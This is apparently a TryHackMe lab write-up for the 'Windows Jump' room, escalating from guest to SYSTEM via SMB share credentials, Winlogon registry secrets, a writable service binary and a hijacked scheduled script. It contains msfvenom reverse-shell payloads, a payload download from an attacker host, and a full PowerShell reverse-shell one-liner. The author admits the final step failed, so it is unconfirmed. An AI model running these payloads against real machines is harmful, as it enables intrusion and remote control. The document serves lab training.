## Windows Jump — Tryhackme Writeup

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/jump.png)

**Room Description**: Use privilege escalation knowledge to jump from a guest user to SYSTEM.

**Room Link**: [Windows Jump](https://tryhackme.com/room/windowsjump)

> A routine vulnerability scan flagged a Windows machine on the internal network; nothing alarming on the surface, just a standard workstation left behind after a round of layoffs. IT never cleaned it up properly. Your job is to find out how badly. Your objective is to escalate from guest access all the way through:  

> guest->thmuser->notadmin->svcadmin->SYSTEM


---

#### Objectives:
 - What are the contents of flag1.txt?
 - What are the contents of flag2.txt?
 - What are the contents of flag3.txt?
 - What are the contents of flag4.txt?

---

> Add the target to hosts:

```zsh
sudo echo -e '10.129.147.245 windows.thm' | sudo tee -a /etc/hosts
```

---

## Enum & Recon

```zsh
nmap -Pn -T4 -p- 10.128.140.167

Nmap scan report for windows.thm (10.128.140.167)
Host is up (0.074s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
```


### SMB Enum

> I use netexec for this phase, however, you can use other tools like `smbclient` to your liking

```zsh
nxc smb windows.thm -u 'guest' -p '' --shares

SMB         10.128.149.247  445    PRIVESC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRIVESC) (domain:privesc) (signing:False) (SMBv1:None)
SMB         10.128.149.247  445    PRIVESC          [+] privesc\guest: 
SMB         10.128.149.247  445    PRIVESC          [*] Enumerated shares
SMB         10.128.149.247  445    PRIVESC          Share           Permissions     Remark
SMB         10.128.149.247  445    PRIVESC          -----           -----------     ------
SMB         10.128.149.247  445    PRIVESC          ADMIN$                          Remote Admin
SMB         10.128.149.247  445    PRIVESC          C$                              Default share
SMB         10.128.149.247  445    PRIVESC          IPC$            READ            Remote IPC
SMB         10.128.149.247  445    PRIVESC          Public          READ            Public file share
```

```zsh
nxc smb windows.thm -u 'guest' -p '' --share Public --dir --get-file welcome.txt welcome.txt
SMB         10.128.149.247  445    PRIVESC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRIVESC) (domain:privesc) (signing:False) (SMBv1:None)
SMB         10.128.149.247  445    PRIVESC          [+] privesc\guest: 
SMB         10.128.149.247  445    PRIVESC          Perms    File Size      Date                          File Path                                    
SMB         10.128.149.247  445    PRIVESC          -----    ---------      ----                          ---------                                    
SMB         10.128.149.247  445    PRIVESC          dr--     0              Tue May 19 03:28:35 2026      .                                            
SMB         10.128.149.247  445    PRIVESC          dr--     0              Tue May 19 03:28:35 2026      ..                                           
SMB         10.128.149.247  445    PRIVESC          fr--     177            Tue May 19 03:28:35 2026      welcome.txt                                  
SMB         10.128.149.247  445    PRIVESC          [*] Copying "welcome.txt" to "welcome.txt"
SMB         10.128.149.247  445    PRIVESC          [+] File "welcome.txt" was downloaded to "welcome.txt"
```

> Reading the file, and discovering credentials

```zsh
more welcome.txt 
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : Password1!

Please change your password after first login.
```

---

## Initial Foothold: thmuser

> I used RDP for connection, however, winrm also can be used

```zsh
xfreerdp /v:10.128.149.247 /u:thmuser /p:'Password1!'
```

> Read the first flag:

```Powershell
type C:\Users\thmuser\Desktop\flag1.txt
```

## PrivEsc: Notadmin

> To find the credentials for notadmin, we can query registry records, specifically WinLogon, where sometimes credentials are stored for automatic sign-in's.

```zsh
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-22%2012-42-05.png)

> And we discover the creds for notadmin. Let's authenticate.

---

## Lateral Movement - notadmin

> I used runas to drop a shell and read the second flag inside "C:\Users\notadmin\Desktop\flag2.txt"

```Powershell
runas /user:notadmin "powershell.exe"
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2010-57-15.png)

> Read the second flag:

```Powershell
type C:\Users\notadmin\Desktop\flag2.txt
```

---

## PrivEsc - svcadmin

> I enumerated running services, and looked for a service running looking suspicious by the user `svcadmin`

```Powershell
wmic service get Name,DisplayName,StartName,PathName | findstr svcadmin
```

> And there was a service under the name of `THMSvc` running. Using `icacls` we can see what permissions our group or user has on the service.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2013-28-35.png)


> Looks like we actually have write permissions, leading to `service binary hijack`, where we can override the `srv.exe`, restart the service and execute it under the name of `svcadmin` user.


> First, let's create our evil binary

```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.137.208 LPORT=4444 -f exe -o svc.exe
```

> Then configure the http.server using python to transfer the binary to target machine. To download it, we can use:

```Powershell
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/svc.exe -OutFile .\svc.exe
```


```
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.128.175.147 - - [23/Sep/2026 08:34:11] "GET /svc.exe HTTP/1.1" 200 -
```


> Now setup a listener on kali, and start the service on target machine. Beware that you might run into permission error like I did, so grant the binary the permission to be run by everyone using icacls. Then you can replace the target binary with our evil binary, and run the service to get the reverse shell. And make sure to use `sc.exe` instead of an alias `sc` (Set-Content) which creates a new file.

```Powershell
icacls svc.exe /grant Everyone:F

move .\svc.exe C:\Windows\THMSVC\svc.exe

sc.exe start THMSvc
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2016-38-30.png)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2016-47-27.png)


---

## PrivEsc - SYSTEM

> After dropping the shell, we can go ahead and transfer `winpeas.ps1` to check for privesc trajectories. You can just run `winpeas` in your kali terminal, and it will cd into that directory. Then, use the python http.server to broadcast it. And download it from the victim machine.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2017-15-51.png)

> Be patient while it runs. From the output, there is an unusual directory: `C:\Windows\Tasks`, where we can discovery a cleanup script called `cleanup.bat`.

```Powershell
PS C:\Windows\Tasks> ls

    Directory: C:\Windows\Tasks


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        5/11/2026   6:41 AM             41 cleanup.bat                                                           


PS C:\Windows\Tasks>
```

> Let's view the permissions and ownership:

```Powershell
PS C:\Windows\Tasks> icacls C:\Windows\Tasks
icacls C:\Windows\Tasks
C:\Windows\Tasks NT AUTHORITY\Authenticated Users:(RX,WD)
                 BUILTIN\Administrators:(F)
                 BUILTIN\Users:(OI)(CI)(RX)
                 PRIVESC\svcadmin:(OI)(CI)(M)
                 BUILTIN\Administrators:(OI)(CI)(F)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(F)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 CREATOR OWNER:(OI)(CI)(IO)(F)
```

> For CMD:

```CMD
C:\Windows\Tasks>dir /q C:\Windows\Tasks

 Directory of C:\Windows\Tasks

05/11/2026  06:42 AM    <DIR>          NT AUTHORITY\SYSTEM    .
05/11/2026  06:42 AM    <DIR>          NT SERVICE\TrustedInsta..
05/11/2026  06:41 AM                41 BUILTIN\Administrators cleanup.bat
               1 File(s)             41 bytes
               2 Dir(s)  14,712,745,984 bytes free

C:\Windows\Tasks>
```

> Unfortunately, the payload I used that could also give me a rev shell did not work:

```Powershell
PS C:\Windows\Tasks> type cleanup.bat

@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('192.168.137.208',9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

> So I generated another .exe using msfvenom, and transferred it as cleanup.bat.

> Generate fun.exe

```zsh
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.137.208 LPORT=9001 -f exe -o fun.exe
```

> Victim

```Powershell
PS C:\Invoke-WebRequest -Uri http://192.168.137.208:8000/fun.exe -OutFile C:\Windows\Tasks\cleanup.exe

PS C:\Windows\Tasks> dir
dir


    Directory: C:\Windows\Tasks


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/23/2026   2:18 PM           7680 cleanup.bat
-a----        9/23/2026   2:18 PM           7680 cleanup.exe                                                           

PS C:\Windows\Tasks>
```

> Overwrite the content with echo:

```Powershell
echo C:\Windows\Tasks\cleanup.exe > .\cleanup.bat
```

> Open a listener on port 9001, receive the connection and read the flag.

```Powershell
type C:\flag4.txt
```

---

> The lab was too problematic for me, I had to restart like 9-10 times, did the whole thing from the start, but unfortunately for me, it did not work out, and the last reverse shell was just impossible to get, though I was doing everything right, even with the help of writeups. Sorry about that :( 
